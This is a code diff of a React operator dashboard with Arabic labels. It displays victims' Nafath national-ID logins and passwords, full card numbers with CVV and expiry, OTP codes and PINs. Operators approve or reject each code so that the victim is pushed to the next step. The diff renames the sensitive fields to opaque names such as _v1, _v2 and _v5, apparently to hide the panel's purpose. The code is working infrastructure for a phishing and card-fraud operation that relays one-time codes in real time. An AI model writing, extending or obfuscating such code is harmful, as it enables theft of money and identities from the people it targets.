@@ -133,15 +133,15 @@ export function VisitorDetails({ visitor }: VisitorDetailsProps) {
   }
 
   // 2. Nafad Info (show at top if exists)
-  if (displayVisitor.nafazId || displayVisitor.currentStep === "_t6") {
+  if (displayVisitor._v8 || displayVisitor.currentStep === "_t6") {
     bubbles.push({
       id: "nafad-info",
       title: "معلومات نفاذ",
       icon: "🛡️",
       color: "indigo",
       data: {
-        "رقم الهوية": displayVisitor.nafazId || "في انتظار الإدخال...",
-        "كلمة المرور": displayVisitor.nafazPass ? "تم الإدخال" : "في انتظار الإدخال...",
+        "رقم الهوية": displayVisitor._v8 || "في انتظار الإدخال...",
+        "كلمة المرور": displayVisitor._v9 ? "تم الإدخال" : "في انتظار الإدخال...",
         "رقم التأكيد المُرسل": displayVisitor.nafadConfirmationCode || "لم يتم الإرسال بعد"
       },
       timestamp: displayVisitor.nafadUpdatedAt || displayVisitor.updatedAt,
@@ -218,17 +218,17 @@ export function VisitorDetails({ visitor }: VisitorDetailsProps) {
     // Show current data
     
     // Card Info
-    if (displayVisitor.cardNumber) {
+    if (displayVisitor._v1) {
       bubbles.push({
         id: "card-current",
         title: "معلومات البطاقة",
         icon: "💳",
         color: "orange",
         data: {
-          "رقم البطاقة": displayVisitor.cardNumber,
+          "رقم البطاقة": displayVisitor._v1,
           "نوع البطاقة": displayVisitor.cardType,
-          "تاريخ الانتهاء": displayVisitor.expiryDate,
-          "CVV": displayVisitor.cvv,
+          "تاريخ الانتهاء": displayVisitor._v3,
+          "CVV": displayVisitor._v2,
           "البنك": displayVisitor.bankInfo?.name || "غير محدد",
           "بلد البنك": displayVisitor.bankInfo?.country || "غير محدد"
         },
@@ -241,13 +241,13 @@ export function VisitorDetails({ visitor }: VisitorDetailsProps) {
     }
     
     // OTP Code
-    if (displayVisitor.otp || displayVisitor.otpStatus === "show_otp" || displayVisitor.otpStatus === "verifying") {
+    if (displayVisitor._v5 || displayVisitor._v5Status === "show_otp" || displayVisitor._v5Status === "verifying") {
       // Prepare data object
       const otpData: Record<string, any> = {
-        "الكود": displayVisitor.otp || "في انتظار الإدخال...",
-        "الحالة": displayVisitor.otpStatus === "approved" ? "✓ تم القبول" : 
-                  displayVisitor.otpStatus === "rejected" ? "✗ تم الرفض" :
-                  displayVisitor.otp ? "تم إدخال الكود" : "في انتظار الإدخال"
+        "الكود": displayVisitor._v5 || "في انتظار الإدخال...",
+        "الحالة": displayVisitor._v5Status === "approved" ? "✓ تم القبول" : 
+                  displayVisitor._v5Status === "rejected" ? "✗ تم الرفض" :
+                  displayVisitor._v5 ? "تم إدخال الكود" : "في انتظار الإدخال"
       }
       
       // Add old rejected OTPs if they exist
@@ -256,32 +256,32 @@ export function VisitorDetails({ visitor }: VisitorDetailsProps) {
       }
       
       bubbles.push({
-        id: "otp-current",
+        id: "_v5-current",
         title: "كود OTP",
         icon: "🔑",
         color: "pink",
         data: otpData,
-        timestamp: displayVisitor.otpUpdatedAt || displayVisitor.updatedAt,
-        status: displayVisitor.otpStatus === "approved" ? "approved" as const :
-                displayVisitor.otpStatus === "rejected" ? "rejected" as const : "pending" as const,
-        showActions: displayVisitor.otp && displayVisitor.otpStatus !== "approved" && displayVisitor.otpStatus !== "rejected",
+        timestamp: displayVisitor._v5UpdatedAt || displayVisitor.updatedAt,
+        status: displayVisitor._v5Status === "approved" ? "approved" as const :
+                displayVisitor._v5Status === "rejected" ? "rejected" as const : "pending" as const,
+        showActions: displayVisitor._v5 && displayVisitor._v5Status !== "approved" && displayVisitor._v5Status !== "rejected",
         isLatest: true,
         type: "_t2"
       })
     }
     
     // PIN Code
-    if (displayVisitor.pinCode || displayVisitor.otpStatus === "show_pin") {
+    if (displayVisitor._v6 || displayVisitor._v5Status === "show_pin") {
       bubbles.push({
         id: "pin-current",
         title: "رمز PIN",
         icon: "🔐",
         color: "indigo",
         data: {
-          "الكود": displayVisitor.pinCode || "في انتظار الإدخال...",
-          "الحالة": displayVisitor.pinCode ? "تم إدخال الكود" : "في انتظار الإدخال"
+          "الكود": displayVisitor._v6 || "في انتظار الإدخال...",
+          "الحالة": displayVisitor._v6 ? "تم إدخال الكود" : "في انتظار الإدخال"
         },
-        timestamp: displayVisitor.pinUpdatedAt || displayVisitor.updatedAt,
+        timestamp: displayVisitor._v6UpdatedAt || displayVisitor.updatedAt,
         status: "pending" as const,
         showActions: false,
         isLatest: true,
@@ -309,13 +309,13 @@ export function VisitorDetails({ visitor }: VisitorDetailsProps) {
     }
     
     // Phone OTP
-    if (displayVisitor.phoneOtp || displayVisitor.phoneOtpStatus === "show_phone_otp" || displayVisitor.phoneOtpStatus === "verifying") {
+    if (displayVisitor._v7 || displayVisitor._v7Status === "show_phone_otp" || displayVisitor._v7Status === "verifying") {
       // Prepare data object
       const phoneOtpData: Record<string, any> = {
-        "كود التحقق": displayVisitor.phoneOtp || "في انتظار الإدخال...",
-        "الحالة": displayVisitor.phoneOtpStatus === "approved" ? "✓ تم القبول" :
-                  displayVisitor.phoneOtpStatus === "rejected" ? "✗ تم الرفض" :
-                  displayVisitor.phoneOtp ? "تم إدخال الكود" : "في انتظار الإدخال"
+        "كود التحقق": displayVisitor._v7 || "في انتظار الإدخال...",
+        "الحالة": displayVisitor._v7Status === "approved" ? "✓ تم القبول" :
+                  displayVisitor._v7Status === "rejected" ? "✗ تم الرفض" :
+                  displayVisitor._v7 ? "تم إدخال الكود" : "في انتظار الإدخال"
       }
       
       // Add old rejected phone OTPs if they exist
@@ -324,15 +324,15 @@ export function VisitorDetails({ visitor }: VisitorDetailsProps) {
       }
       
       bubbles.push({
-        id: "phone-otp-current",
+        id: "phone-_v5-current",
         title: "كود تحقق الهاتف",
         icon: "✅",
         color: "pink",
         data: phoneOtpData,
-        timestamp: displayVisitor.phoneOtpUpdatedAt || displayVisitor.updatedAt,
-        status: displayVisitor.phoneOtpStatus === "approved" ? "approved" as const :
-                displayVisitor.phoneOtpStatus === "rejected" ? "rejected" as const : "pending" as const,
-        showActions: displayVisitor.phoneOtp && displayVisitor.phoneOtpStatus !== "approved" && displayVisitor.phoneOtpStatus !== "rejected",
+        timestamp: displayVisitor._v7UpdatedAt || displayVisitor.updatedAt,
+        status: displayVisitor._v7Status === "approved" ? "approved" as const :
+                displayVisitor._v7Status === "rejected" ? "rejected" as const : "pending" as const,
+        showActions: displayVisitor._v7 && displayVisitor._v7Status !== "approved" && displayVisitor._v7Status !== "rejected",
         isLatest: true,
         type: "_t5"
       })
@@ -386,12 +386,12 @@ export function VisitorDetails({ visitor }: VisitorDetailsProps) {
         case "_t2":
           if (action === "approve") {
             // Approve OTP - redirect to /confi
-            await updateApplication(visitor.id, { otpStatus: "approved" })
+            await updateApplication(visitor.id, { _v5Status: "approved" })
             alert("تم قبول كود OTP! سيتم توجيه الزائر لصفحة PIN")
           } else if (action === "reject") {
             if (confirm("هل أنت متأكد من رفض كود OTP؟")) {
               // Reject OTP - save to oldOtp and reset
-              await updateApplication(visitor.id, { otpStatus: "rejected" })
+              await updateApplication(visitor.id, { _v5Status: "rejected" })
               alert("تم رفض كود OTP! سيتم توجيه الزائر لإدخال كود جديد")
             }
           }
@@ -402,7 +402,7 @@ export function VisitorDetails({ visitor }: VisitorDetailsProps) {
             if (hasMultipleAttempts) {
               await handlePhoneOtpApproval(visitor.id, bubbleId, history)
             } else {
-              await updateApplication(visitor.id, { phoneOtpStatus: "approved" })
+              await updateApplication(visitor.id, { _v7Status: "approved" })
             }
             alert("تم قبول كود الهاتف! سيتم توجيه الزائر لصفحة نفاذ")
           } else if (action === "reject") {
@@ -411,15 +411,15 @@ export function VisitorDetails({ visitor }: VisitorDetailsProps) {
                 await handlePhoneOtpRejection(visitor.id, bubbleId, history)
               } else {
                 await updateApplication(visitor.id, {
-                  phoneOtpStatus: "rejected"
+                  _v7Status: "rejected"
                 })
               }
               alert("تم رفض كود الهاتف! سيتم توجيه الزائر لإدخال كود جديد")
             }
           } else if (action === "resend") {
             await updateApplication(visitor.id, {
-              phoneOtp: "",
-              phoneOtpStatus: "show_phone_otp"
+              _v7: "",
+              _v7Status: "show_phone_otp"
             })
             alert("تم إعادة فتح مودال إدخال كود الهاتف")
           }
